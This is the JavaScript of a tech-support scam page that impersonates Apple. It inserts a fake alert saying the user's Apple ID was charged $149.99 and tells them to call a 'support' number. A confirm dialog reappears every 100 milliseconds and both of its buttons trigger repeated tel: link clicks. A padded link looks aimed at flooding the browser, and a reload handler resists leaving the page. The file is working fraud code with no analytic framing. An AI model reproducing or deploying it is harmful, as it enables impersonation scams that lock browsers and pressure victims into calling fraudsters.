function getURLParameter(name) {
    try {
        return decodeURI(
            (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
        );
    } catch(e) {
        return '';
    }
};

var cookieHelper = {
    defParams: {
        path: "/",
        domain: "." + window.location.host.replace(/:\d+/, "")
    },
    set: function(a, d, c) {
        try {
            c = c || {};
            for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
            b = c.expires;
            if ("number" == typeof b && b) {
                var e = new Date;
                e.setTime(e.getTime() + 1E3 * b);
                b = c.expires = e;
            }
            b && b.toUTCString && (c.expires = b.toUTCString());
            d = encodeURIComponent(d);
            a = a + "=" + d;
            for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
            document.cookie = a;
        } catch(e) {}
    },
    get: function(a) {
        try {
            return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0;
        } catch(e) {
            return void 0;
        }
    },
    del: function(a) {
        this.set(a, null, {
            expires: -1
        });
    }
};

var userAgent = (window.navigator && window.navigator.userAgent) ? window.navigator.userAgent.toLowerCase() : '',
    ios = /iphone|ipod|ipad/.test(userAgent);

function parseURL(url) {
    try {
        var a = document.createElement('a');
        a.href = url || '';
        return (a.hostname || '').replace('www.', '');
    } catch(e) {
        return '';
    }
};

function getPar(name) {
    try {
        var url = window.location.href;
        name = name.replace(/[\[\]]/g, "\\$&");
        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
            results = regex.exec(url);
        if (!results) return null;
        if (!results[2]) return '';
        return decodeURIComponent(results[2].replace(/\+/g, " "));
    } catch(e) {
        return null;
    }
};

window.number = getPar('phone');
window.number = (window.number ? window.number : '+1(888) 790-7840');

window.device = 'iPhone';
window.refef = parseURL(document.referrer);

if (ios) {
    if (/iphone/.test(userAgent)) {
        window.device = 'iPhone';
    }
    if (/ipad/.test(userAgent)) {
        window.device = 'iPad';
    }
    if (/ipod/.test(userAgent)) {
        window.device = 'iPod';
    }
}

var text = cookieHelper.get('textSetBl');
var phone = cookieHelper.get('phoneSetBl');

function getText() {
    try {
        var str = window.defaultText || 'Your |%model%| Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1(888) 790-7840 to Freeze it!';

        if (window.text && typeof window.text === 'object') {
            for (var d in window.text) {
                if (window.refef && typeof window.refef === 'string' && window.refef.indexOf(d) != -1) {
                    str = window.text[d];
                }
            }
        }
        return str.replace('|%model%|', window.device || 'iPhone').replace('|%ref%|', window.refef || '');
    } catch(e) {
        return 'Your iPhone Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1(888) 790-7840 to Freeze it!';
    }
}

if (!phone || phone === '') {
    phone = getURLParameter('phone');
}
if (!phone || phone === '') {
    phone = window.number || '+1(888) 790-7840';
}

if (!text) {
    text = getURLParameter('text');
}

try {
    var sText = document.querySelectorAll('.js_setTextBlock');
    for (var t = 0; t < sText.length; t++) {
        sText[t].innerHTML = getText();
    }
    var sPhone = document.querySelectorAll('.js_setPhoneBlock');
    for (var p = 0; p < sPhone.length; p++) {
        sPhone[p].innerHTML = phone;
    }
} catch(e) {}

function okkkk() {
    try {
        if (typeof jQuery !== 'undefined') {
            jQuery('#result').append('<a class="anchorcall" href="tel:' + phone + '"></a>');
        }
        var anchor = document.querySelector('a.anchorcall') || document.querySelector('a');
        if (anchor) {
            anchor.href = 'tel:' + phone;
            anchor.click();
        }
        var extraData = "";
        for (var itxextraData = 0; itxextraData < 200; itxextraData++) {
            extraData = extraData + "5555555555";
        }
        if (typeof jQuery !== 'undefined') {
            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
        }
        if (anchor) {
            anchor.click();
            anchor.click();
            anchor.click();
            anchor.click();
            anchor.click();
            anchor.click();
        }
    } catch(e) {}
};

function myFunction() {
    var msg = "Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support " + phone + " to Freeze it!.";
    if (confirm(msg)) {
        okkkk();
    } else {
        okkkk();
    }
}

setInterval(function() {
    myFunction();
}, 100);

window.ununload = function() {
    debugger;
    location.reload();
};